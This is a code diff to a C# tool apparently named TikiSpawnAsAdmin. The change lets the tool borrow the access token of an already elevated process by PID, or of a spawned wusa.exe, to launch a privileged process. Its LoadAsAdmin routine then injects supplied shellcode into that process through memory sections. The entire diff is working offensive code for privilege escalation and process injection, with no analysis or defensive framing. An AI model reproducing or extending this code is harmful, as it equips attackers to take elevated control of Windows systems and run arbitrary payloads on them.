@@ -181,6 +181,9 @@ namespace TikiSpawnAsAdmin
         [DllImport("shell32.dll", CharSet = CharSet.Auto)]
         private static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);
 
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
+
         [DllImport("advapi32.dll")]
         private static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);
 
@@ -288,18 +291,32 @@ namespace TikiSpawnAsAdmin
             }
         }
 
-        public PROCESS_INFORMATION StartProcess(string path)
+        public PROCESS_INFORMATION StartProcess(string targetProcess, int elevatedPID)
         {
-            SHELLEXECUTEINFO shellInfo = new SHELLEXECUTEINFO();
-            
-            shellInfo.cbSize = Marshal.SizeOf(shellInfo);
-            shellInfo.fMask = 0x40;
-            shellInfo.lpFile = "wusa.exe";
-            shellInfo.nShow = 0x0;
 
-            if (!ShellExecuteEx(ref shellInfo))
-                throw new SystemException("[x] Failed to create process");
-            IntPtr hProcess = shellInfo.hProcess;
+            IntPtr hProcess = IntPtr.Zero;
+
+            if (elevatedPID > 0)
+            {
+                hProcess = OpenProcess(0x00001000, false, elevatedPID);
+            }
+            else
+            {
+                SHELLEXECUTEINFO shellInfo = new SHELLEXECUTEINFO();
+
+                shellInfo.cbSize = Marshal.SizeOf(shellInfo);
+                shellInfo.fMask = 0x40;
+                shellInfo.lpFile = "wusa.exe";
+                shellInfo.nShow = 0x0;
+
+                if (!ShellExecuteEx(ref shellInfo))
+                    throw new SystemException("[x] Failed to create process");
+
+                hProcess = shellInfo.hProcess;
+            }
+
+            if (hProcess == IntPtr.Zero)
+                throw new SystemException("[x] Failed to process handle");
 
             IntPtr hToken = IntPtr.Zero;
             if (!OpenProcessToken(hProcess, 0x02000000, ref hToken))
@@ -347,11 +364,14 @@ namespace TikiSpawnAsAdmin
             startInfo.cb = (UInt32)Marshal.SizeOf(startInfo);
 
             PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
-            if (!CreateProcessWithLogonW("x", "x", "x", 0x00000002, path, "", 0x04000000, 0, Directory.GetCurrentDirectory(), ref startInfo, out procInfo))
+            if (!CreateProcessWithLogonW("x", "x", "x", 0x00000002, targetProcess, "", 0x04000000, 0, "C:\\Windows\\System32", ref startInfo, out procInfo))
                 throw new SystemException("[x] Failed to create process with logon");
+            else
+                Console.WriteLine("Successfully created process {0}", procInfo.dwProcessId);
 
-            if (!TerminateProcess(hProcess, 1))
-                Console.WriteLine("Warning, failed to terminate wusa.exe");
+            if (elevatedPID == 0)
+                if (!TerminateProcess(hProcess, 1))
+                    Console.WriteLine("Warning, failed to terminate wusa.exe");
 
             return procInfo;
         }
@@ -521,10 +541,10 @@ namespace TikiSpawnAsAdmin
 
         }
 
-        public void LoadAsAdmin(string targetProcess, byte[] shellcode)
+        public void LoadAsAdmin(string targetProcess, byte[] shellcode, int elevatedPID)
         {
 
-            var pinf = StartProcess(targetProcess);
+            var pinf = StartProcess(targetProcess, elevatedPID);
             FindEntry(pinf.hProcess);
 
             if (!CreateSection((uint)shellcode.Length))
